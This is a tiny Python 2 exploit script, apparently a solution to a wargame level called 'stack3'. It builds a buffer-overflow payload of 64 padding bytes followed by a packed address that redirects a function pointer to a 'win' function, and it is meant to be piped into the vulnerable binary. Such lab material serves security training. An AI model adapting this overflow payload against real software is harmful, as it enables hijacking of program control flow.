#!/usr/bin/python

import struct

#NOTE
#Usage:
#./exploit.py | ./stack3
PAD = "A" * 64

WIN_FUNCTION = struct.pack("I" , 0x08048424)
#Change the value of the pointer from return to win function.

exploit = PAD + WIN_FUNCTION
print exploit
